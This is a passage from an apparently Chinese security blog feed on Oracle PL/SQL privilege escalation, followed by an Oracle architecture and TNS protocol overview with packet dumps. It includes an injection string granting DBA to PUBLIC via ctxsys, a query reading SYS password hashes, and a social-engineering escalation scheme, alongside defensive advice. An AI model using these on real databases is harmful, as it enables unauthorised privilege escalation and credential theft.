TRIGGER</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>高</td><td>CREATE ANY VIEW</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>中</td><td>CREATE functions</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>中</td><td>CREATE procedure</td><td>少</td><td>大</td><td>降低用户权限、升级补丁、取消 public权限</td></tr><tr><td>低</td><td>CREATE connection-注入匿名</td><td>少</td><td>大</td><td>升级补丁、取消 public权限</td></tr><tr><td>低</td><td>CREATE connection-snarf攻击</td><td>极少</td><td>大</td><td>注意关闭游标</td></tr><tr><td>低</td><td>CREATE connection-利用java</td><td>极少</td><td>小</td><td>删除Java、取消 public权限</td></tr></tbody></table><h3 id="2-3-PL-SQL-漏洞利用"><a href="#2-3-PL-SQL-漏洞利用" class="headerlink" title="2.3 PL/SQL 漏洞利用"></a>2.3 PL/SQL 漏洞利用</h3><p>定义者权限和调用者权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT DBA TO USER</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT PASSWORD FROM SYS.USER$ WHERE NAME=&#x27;SYS&#x27;;</span><br></pre></td></tr></table></figure><p>用调用者权限创建一个函数——————————-&gt;用带有public权限的SYS函数调用黑客创建的函数</p><p>标准SQL注入提权思路例子：</p><p>1.用低权限用户写一个调用者权限的函数get_dba，内容是低权限用户无法执行的提权操作，并设置运行时编译。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%83.png"></p><p>2.将get_dba函数放入public，使得高权限用户可以防问；社会工程学诱骗，sys用户执行get_dba函数，成功提取。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%832.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E6%8F%90%E6%9D%833.png"></p><h3 id="2-4-PL-SQL-DBMS-SQL包"><a href="#2-4-PL-SQL-DBMS-SQL包" class="headerlink" title="2.4 PL/SQL DBMS_SQL包"></a>2.4 PL/SQL DBMS_SQL包</h3><h4 id="2-4-1-DBMS-SQL执行流程"><a href="#2-4-1-DBMS-SQL执行流程" class="headerlink" title="2.4.1 DBMS_SQL执行流程"></a>2.4.1 DBMS_SQL执行流程</h4><p>通常运用DBMS_SQL包一般分为如下几步：</p><ol><li><p>open cursor：打开cursor</p></li><li><p>parse cursor：解析你要执行的SQL语句，生成任务计划</p></li><li><p>bind variable：如果要执行的SQL语句中包含变量，在此就需要绑定变量</p></li><li><p>execute：执行SQL语句</p></li><li><p>close cursor：在执行后关闭此cursor.</p></li></ol><p>如果你还需要返回执行SQL的结果集，还需要使用define_column,define_array等方法，具体可以看如下流程图：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p><h4 id="2-4-2-DBMS-SQL特点"><a href="#2-4-2-DBMS-SQL特点" class="headerlink" title="2.4.2 DBMS_SQL特点"></a>2.4.2 DBMS_SQL特点</h4><ul><li><p><strong>一定条件下可执行任意语句</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS_SQL_PARSE(C IN INTEGER, STATUMENT IN VARCHAR2, LANGUAGE_FLAG IN INTEGER) IS</span><br></pre></td></tr></table></figure></li><li><p><strong>包是PUBLIC属性，只要能连接到数据库就能调用</strong></p></li><li><p><strong>调用者权限</strong></p></li></ul><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E8%B0%83%E7%94%A8%E8%80%85%E6%9D%83%E9%99%90%E5%A3%B0%E6%98%8E.png"></p><p>想办法绕过调用者权限</p><p>1.高权限用户sys，定义一个名为A的public属性的具有定义者权限的过程，并调用了DBMS_SQL.PARSE接口，此接口存在一个参数能传入一个动态字符串并执行sql。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E7%AA%81%E7%A0%B4DBMS_SQL%E7%9A%84%E9%99%90%E5%88%B61.png"></p><p>2.低权限soctt用户执行public属性的A过程，虽然报错但是执行成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E7%AA%81%E7%A0%B4DBMS_SQL%E7%9A%84%E9%99%90%E5%88%B62.png"></p><p>3.提权成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F.png"></p><h4 id="2-4-3-漏洞成因"><a href="#2-4-3-漏洞成因" class="headerlink" title="2.4.3 漏洞成因"></a>2.4.3 漏洞成因</h4><p>危险的定义者权限</p><p>危险的public执行权限</p><p>禁止执行任意SQL语句</p><p>加强用户的身份识别</p><p>例子：在9i中ctxsys是DBA账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctxsys.driload.validate_stmt(&#x27;grant dba to public&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/DBMS_SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BE%8B%E5%AD%90.png"></p><p>10g后把这个包的创建者ctxsys权限从DBA中移除了</p><h3 id="2-5-PL-SQL-注入防护建议"><a href="#2-5-PL-SQL-注入防护建议" class="headerlink" title="2.5 PL/SQL 注入防护建议"></a>2.5 PL/SQL 注入防护建议</h3><p>DBMS_SQL.PARSE()最后调用ICD_PARSE，未传入了USERID</p><p>DBMS_SQL.PARSE_AS_USER()最后调用ICD_PARSE，传入了USERID</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/%E9%98%B2%E6%8A%A4%E7%94%A8%E6%88%B7%E5%88%A4%E6%96%AD.png"></p><p>所以建议使用DBMS_SQL.PARSE_AS_USER()</p><p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;by Tahir&lt;/p&gt;
&lt;h2 id=&quot;1-PL-SQL概述&quot;&gt;&lt;a href=&quot;#1-PL-SQL概述&quot; class=&quot;headerlink&quot; title=&quot;1.PL/SQL概述&quot;&gt;&lt;/a&gt;1.PL/SQL概述&lt;/h2&gt;&lt;p&gt;PL/SQL是一种</summary>
      
    
    
    
    <category term="数据库安全" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database简单概述</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/</id>
    <published>2021-07-03T02:59:15.000Z</published>
    <updated>2021-07-03T03:04:35.397Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Oracle-数据库体系结构"><a href="#Oracle-数据库体系结构" class="headerlink" title="Oracle 数据库体系结构"></a>Oracle 数据库体系结构</h2><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/1.gif" style="zoom: 150%;">   <p>分为两个大部分：</p><h3 id="RDBMS-关系数据库管理系统"><a href="#RDBMS-关系数据库管理系统" class="headerlink" title="RDBMS 关系数据库管理系统"></a>RDBMS 关系数据库管理系统</h3><p>控制文件（.ctl）</p><p>数据文件（.dbf）</p><p>日志文件（.log）</p><p>SGA：系统全局区，主要包括：</p><p>共享池：用于存储最近定义的sql语句和数据定义。</p><p>Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。</p><p>1）数据块缓存区<br>数据块缓存区(datablockbuffercache)是SGA中的一个高速缓存区域，用来存储从数据库中读取数据段的数据块(如表、索引和簇)。数据块缓存区的大小由数据库服务器init.ora文件中的DB_LOCK_BUFFERS参数决定(用数据库块的个数表示)。在调整和管理数据库时，调整数据块缓存区的大小是一个重要的部分。</p><p>2）字典缓存区<br>数据库对象的信息存储在数据字典表中，这些信息包括用户帐号数据、数据文件名、段名、盘区位置、表说明和权限，当数据库需要这些信息(如检查用户查询一个表的授权)时，将读取数据字典表并且将返回的数据存储在字典缓存区的SGA中。</p><p>3）重做日志缓冲区<br>重做项描述对数据库进行的修改。它们写到联机重做日志文件中，以便在数据库恢复过程中用于向前滚动操作。然而，在被写入联机重做日志文件之前，事务首先被记录在称作重做日志缓冲区(redologbuffer)的SGA中。数据库可以周期地分批向联机重做日志文件中写重做项的内容，从而优化这个操作。重做日志缓冲区的大小(以字节为单位)由init.ora文件中的LOG_BUFFER参数决定。</p><p>4）SQL共享池<br>SQL共享池存储数据字典缓存区及库缓存区(librarycache)，即对数据库进行操作的语句信息。当数据块缓冲区和字典缓存区能够共享数据库用户间的结构及数据信息时，库缓存区允许共享常用的SQL语句。</p><p>SQL共享池包括执行计划及运行数据库的SQL语句的语法分析树。在第二次运行(由任何用户)相同的SQL语句时，可以利用SQL共享池中可用的语法分析信息来加快执行速度。</p><p>SQL共享池通过LRU算法来管理。当SQL共享池填满时，将从库缓存区中删掉最近最少使用的执行路径和语法分析树，以便为新的条目腾出空间。如果SQL共享池太小，语句将被连续不断地再装入到库缓存区，从而影响操作性能。</p><p>SQL共享池的大小(以字节为单位)由init.ora文件参数SHARED_POOL_SIZE决定。</p><p>5）大池<br>大池(LargePool)是一个可选内存区。如果使用线程服务器选项或频繁执行备份/恢复操作，只要创建一个大池，就可以更有效地管理这些操作。大池将致力于支持SQL大型命令。利用大池，就可以防止这些SQL大型命令把条目重写入SQL共享池中，从而减少再装入到库缓存区中的语句数量。大池的大小(以字节为单位)通过init.ora文件的LARGE_POOL_SIZE参数设置，用户可以使用init.ora文件的LARGE_POOL_MIN_ALLOC参数设置大池中的最小位置。Oracle8i已不用这个参数。作为使用LargePool的一种选择方案，可以用init.ora文件的SHARED_POOL_RESERVED_SIZE参数为SQL大型语句保留一部分SQL共享池。</p><p>6）Java池<br>由其名字可知，Java池为Java命令提供语法分析。Java池的大小(以字节为单位)通过在Oracle引入的init.ora文件的JAVA_POOL_SIZE参数设置。init.ora文件的JAVA_POOL_SIZE参数缺省设置为10MB。</p><p>7）多缓冲池<br>可以在SGA中创建多个缓冲池，能够用多个缓冲池把大数据集与其他的应用程序分开，以减少它们争夺数据块缓存区内相同资源的可能性。对于创建的每一个缓冲池，都要规定其LRU锁存器的大小和数量。缓冲区的数量必须至少比LRU锁存器的数量多50倍。</p><p>创建缓冲池时，需要规定保存区(keeparea)的大小和再循环区(recyclearea)的大小。与SQL共享池的保留区一样，保存区保持条目，而再循环区则被频繁地再循环使用。可以通过BUFFER_POOL_KEEP参数规定来保存区的大小。例如：<br>保存和再循环缓冲池的容量减少了数据块缓冲存储区中的可用空间(通过DB_BLOCK_BUFFERS参数设置)。对于使用一个新缓冲池的表，通过表的storage子句中的buffer_pool参数来规定缓冲池的名字。例如，如果需要从内存中快速删除一个表，就把它赋予RECYCLE池。缺省池叫作DEFAULT，这样就能在以后用altertable命令把一个表转移到DEFAULT池。</p><p>PGA：为用户进程保留的空间，即服务器进程。</p><p>后台进程：</p><p>• 数据库写进程(DBW<em>n</em>)</p><p>​        负责将数据库缓冲区高速缓存中经过修改的缓冲区（脏数据缓冲区）写入磁盘。在一个数据库实例中，DBWn进程最多可以启动36个，进程名分别为DBWn0、DBWn1、DBWn2、…DBWnj。</p><p>​        注：LRU（Least Recently Used，最近最少使用）：数据缓冲的一种管理机制，只保留最近数据，不保留旧数据。</p><p>​        注：DIRTY：表示“脏列”或者“弄脏了的数据”，实际上就是指被修改但是还没有写入数据文件的数据。</p><p>​        通过命令可以来了解参数信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter db_writer_processes;</span><br></pre></td></tr></table></figure><p>​        DBWn进程最多可以启动20个，所以DB_WRITER_PROCESSES参数的取值范围是1-36。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/3.png"> </p><p>• 日志写进程(LGWR)</p><p>​        负责管理日志缓冲区的一个后台进程，用于将日志缓冲区中的日志数据写入磁盘的日志文件中</p><p>​        在数据库运行时，对数据库的修改操作将被记录到日志信息中，这些日志信息首先保存在日志缓冲区，当日志信息达到一定量时，由LGWR进程将日志数据写入日志文件。</p><p>​        需要LGWR进程将缓冲区数据中的日志数据写入磁盘的主要情况有如下几种：</p><ul><li>用户进程提交（commit）事务</li><li>日志缓冲区池已满1/3</li><li>出现超时（每隔3秒）</li><li>DBWn进程调用磁盘写入进程</li></ul><p>• 检查点进程(CKPT)</p><p>　一般在发生日志切换时产生。在系统运行过程中，当需要将修改后的数据写回数据文件并且产生日志切换时就会产生检查点。检查点保证所有修改过的数据库缓冲区中的数据都被写入磁盘数据文件中。<br>　　在Oracle数据库中，提供了两个参数控制检查点的产生：一个是LOG_CHECKPOINT_TIMEOUT,用来设置检查点产生的时间间隔；另一个是LOG_CHECKPOINT_INTERVAL,用来设置一个检查点需要填充的日志文件块的数目也就是每产生多少个日志数据，自动产生一个检查点。</p><p>​        通过以下命令了解log_checkpoint_timeout参数信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_timeout; </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/4.png"></p><p>​        log_checkpoint_timeout参数默认值为1800，单位为秒。</p><p>​        通过以下命令可以了解log_checkpoint_interval 参数值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show parameter log_checkpoint_interval;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/5.png"></p><p>​        log_checkpoint_interval参数值默认为0。</p><p>• 系统监视器进程(SMON)</p><p>​        在实例启动时执行实例恢复，并负责清理不再使用的临时段。在具有并行服务器选项的环境下，SMON进程对有故障的CPU或者实例进行实例恢复。SMON进程被有规律的唤醒，检查是否需要使用，其他进程需要时也可以调用次进程。（可被hacker调用）</p><p>​        实例恢复：</p><p>• 进程监视器进程(PMON)</p><p>​        用于在用户进程出现故障时执行进程恢复操作，并负责清理内存存储区和释放该进程所用的资源。改进程周期性的检查调度进程和服务器进程的状态，如果发现进程已死，则重新启动它。PMON进程被有规律的唤醒，检查是否需要使用，其他进程需要使用时也可以调用此进程。（可被hacker调用）</p><p>• 归档进程(ARC<em>n</em>)</p><p>• 恢复器进程(RECO)</p><p>• 封锁进程(LCK<em>n</em>)</p><p>• 调度进程(Dnn<em>n</em>)</p><p>• 快照进程(SNP<em>n</em>)</p><p>• 作业队列协调程序(CJQ0)</p><p>• 作业从属进程(J<em>nnn</em>)</p><p>• 队列监视器进程(QMN<em>n</em>)</p><h3 id="TNS监听服务"><a href="#TNS监听服务" class="headerlink" title="TNS监听服务"></a>TNS监听服务</h3><p>​        TNS监听是攻击的重点</p><h4 id="TNS协议结构"><a href="#TNS协议结构" class="headerlink" title="TNS协议结构"></a>TNS协议结构</h4><p>TNS 包由一个header和payload 组成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>通用Header8个字节：</p><table><thead><tr><th>Length</th><th>2</th><th>包的长度，包括通用包头</th></tr></thead><tbody><tr><td>Packet check sum</td><td>2</td><td>包的校验和</td></tr><tr><td>Type</td><td>1</td><td>TNS类型</td></tr><tr><td>Flag</td><td>1</td><td>状态</td></tr><tr><td>Header check sum</td><td>2</td><td>通用头的校验和</td></tr></tbody></table><p>注：</p><p>​    Length：包长度（包括包头）</p><p>​    Type： 数据包的类型</p><table><thead><tr><th>类型号</th><th></th><th>类型说明</th></tr></thead><tbody><tr><td>1</td><td>0x01</td><td>连接（CONNECT）</td></tr><tr><td>2</td><td>0x02</td><td>接受（ACCEPT）</td></tr><tr><td>3</td><td>0x03</td><td>确认（ACK）</td></tr><tr><td>4</td><td>0x04</td><td>拒绝（REFUTE）</td></tr><tr><td>5</td><td>0x05</td><td>重定向（REDIRECT）</td></tr><tr><td>6</td><td>0x06</td><td>数据（DATA）</td></tr><tr><td>7</td><td>0x07</td><td>NULL</td></tr><tr><td>8</td><td>0x08</td><td></td></tr><tr><td>9</td><td>0x09</td><td>中止（ABORT）</td></tr><tr><td>10</td><td>0x0a</td><td></td></tr><tr><td>11</td><td>0x0b</td><td>重新发送（RESEND）</td></tr><tr><td>12</td><td>0x0c</td><td>标记（MARKER）</td></tr><tr><td>13</td><td>0x0d</td><td>ATTENTION</td></tr><tr><td>14</td><td>0x0e</td><td>控制（CONTROL）</td></tr></tbody></table><p>payload：</p><p>Connect 连接类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 254</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Connect (1)</span><br><span class="line">    Reserved Byte: 00</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Connect</span><br><span class="line">        Version: 313</span><br><span class="line">        Version (Compatible): 300</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        NT Protocol Characteristics: 0xc60e</span><br><span class="line">        Line Turnaround Value: 0</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Length of Connect Data: 196</span><br><span class="line">        Offset to Connect Data: 58</span><br><span class="line">        Maximum Receivable Connect Data: 512</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line">        Trace Cross Facility Item 1: 0x00000000</span><br><span class="line">        Trace Cross Facility Item 2: 0x00000000</span><br><span class="line">        Trace Unique Connection ID: 0x0000000000000000</span><br><span class="line">        Connect Data: (DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=ORCL)(CID=(PROGRAM=</span><br><span class="line">                       C:\oracle\product\10.2.0\client_1\bin\sqlplus.exe)</span><br><span class="line">                       (HOST=WINXPSP2)(USER=vmware)))(ADDRESS=(PROTOCOL=TCP)</span><br><span class="line">                       (HOST=192.168.1.102)(PORT=1521)))</span><br><span class="line"> 0.018134   192.168.1.108   192.168.1.102   TNS Request, Connect (1), Connect</span><br><span class="line"> 0000   00 0c 29 0c 9a c7 00 0c 29 fd 07 3d 08 00 45 00  ..).....)..=..E.</span><br><span class="line"> 0010   01 26 05 0b 40 00 80 06 70 a4 c0 a8 01 6c c0 a8  .&amp;..@...p....l..</span><br><span class="line"> 0020   01 66 04 66 05 f1 ac 94 a7 3e 66 d2 7e ee 50 18  .f.f.....&gt;f.~.P.</span><br><span class="line"> 0030   ff ff 15 91 00 00 00 fe 00 00 01 00 00 00 01 39  ...............9</span><br><span class="line"> 0040   01 2c 00 00 08 00 7f ff c6 0e 00 00 01 00 00 c4  .,..............</span><br><span class="line"> 0050   00 3a 00 00 02 00 61 61 00 00 00 00 00 00 00 00  .:....aa........</span><br><span class="line"> 0060   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"> 0070   28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28 43 4f  (DESCRIPTION=(CO</span><br><span class="line"> 0080   4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line"> 0090   49 43 45 5f 4e 41 4d 45 3d 4f 52 43 4c 29 28 43  ICE_NAME=ORCL)(C</span><br><span class="line"> 00a0   49 44 3d 28 50 52 4f 47 52 41 4d 3d 43 3a 5c 6f  ID=(PROGRAM=C:\o</span><br><span class="line"> 00b0   72 61 63 6c 65 5c 70 72 6f 64 75 63 74 5c 31 30  racle\product\10</span><br><span class="line"> 00c0   2e 32 2e 30 5c 63 6c 69 65 6e 74 5f 31 5c 62 69  .2.0\client_1\bi</span><br><span class="line"> 00d0   6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line"> 00e0   4f 53 54 3d 57 49 4e 58 50 53 50 32 29 28 55 53  OST=WINXPSP2)(US</span><br><span class="line"> 00f0   45 52 3d 76 6d 77 61 72 65 29 29 29 28 41 44 44  ER=vmware)))(ADD</span><br><span class="line"> 0100   52 45 53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 54  RESS=(PROTOCOL=T</span><br><span class="line"> 0110   43 50 29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38  CP)(HOST=192.168</span><br><span class="line"> 0120   2e 31 2e 31 30 32 29 28 50 4f 52 54 3d 31 35 32  .1.102)(PORT=152</span><br><span class="line"> 0130   31 29 29 29                                      1)))</span><br></pre></td></tr></table></figure><p>Accept接收类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transparent Network Substrate Protocol</span><br><span class="line">    Packet Length: 32</span><br><span class="line">    Packet Checksum: 0x0000</span><br><span class="line">    Packet Type: Accept (2)</span><br><span class="line">    Reserved Byte: 04</span><br><span class="line">    Header Checksum: 0x0000</span><br><span class="line">    Accept</span><br><span class="line">        Version: 312</span><br><span class="line">        Service Options: 0x0000</span><br><span class="line">        Session Data Unit Size: 2048</span><br><span class="line">        Maximum Transmission Data Unit Size: 32767</span><br><span class="line">        Value of 1 in Hardware: 0100</span><br><span class="line">        Accept Data Length: 0</span><br><span class="line">        Offset to Accept Data: 32</span><br><span class="line">        Connect Flags 0: 0x61</span><br><span class="line">        Connect Flags 1: 0x61</span><br><span class="line"> 00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00   ..)..=..).....E.</span><br><span class="line"> 00 48 7c cf 40 00 80 06 f9 bd c0 a8 01 66 c0 a8   .H|.@........f..</span><br><span class="line"> 01 6c 11 d9 04 67 b6 88 7a 22 0e a7 cb 81 50 18   .l...g..z&quot;....P.</span><br><span class="line"> ff 01 1d 97 00 00 00 20 00 00 02 04 00 00 01 38   ....... .......8</span><br><span class="line"> 00 00 08 00 7f ff 01 00 00 00 00 20 61 61 00 00   ........... aa..</span><br><span class="line"> 00 00 00 00 00 00                                 ......</span><br></pre></td></tr></table></figure><p>Refuse拒绝类型数据如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0.047753   192.168.1.102   192.168.1.108   TNS Response, Refuse (4), Refuse</span><br><span class="line">  00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00  ..)..=..).....E.</span><br><span class="line">  00 8f 53 e2 40 00 80 06 22 64 c0 a8 01 66 c0 a8  ..S.@...&quot;d...f..</span><br><span class="line">  01 6c 05 f1 04 0d e8 a0 2d 2b 67 0d 99 85 50 18  .l......-+g...P.</span><br><span class="line">  fe ff 59 03 00 00 00 67 00 00 04 00 00 00 22 00  ..Y....g......&quot;.</span><br><span class="line">  00 5b 28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28  .[(DESCRIPTION=(</span><br><span class="line">  54 4d 50 3d 29 28 56 53 4e 4e 55 4d 3d 31 35 33  TMP=)(VSNNUM=153</span><br><span class="line">  30 39 32 33 35 32 29 28 45 52 52 3d 31 32 35 31  092352)(ERR=1251</span><br><span class="line">  34 29 28 45 52 52 4f 52 5f 53 54 41 43 4b 3d 28  4)(ERROR_STACK=(</span><br><span class="line">  45 52 52 4f 52 3d 28 43 4f 44 45 3d 31 32 35 31  ERROR=(CODE=1251</span><br><span class="line">  34 29 28 45 4d 46 49 3d 34 29 29 29 29           4)(EMFI=4))))</span><br></pre></td></tr></table></figure><p>​         DATA 包是类型6，包括2个字节的 flag 标志位，1字节的 packet id，可选的 TTI id，还有数据本身。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0           16   24    31</span><br><span class="line">+-----------+----+-----+</span><br><span class="line">| Data Flag | ID |&lt;TTI&gt;|</span><br><span class="line">+----------------------+</span><br><span class="line">|        D A T A       |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p>字段说明：</p><p>Data Flag: 数据标识</p><p>ID：   包ID</p><p>TTI:    TTI(Two-Task Interface) ID</p><p>DATA:   有效数据</p><p>Data Flag 通常是 0x0000， 当所有数据发送完毕指示文件结尾，值为 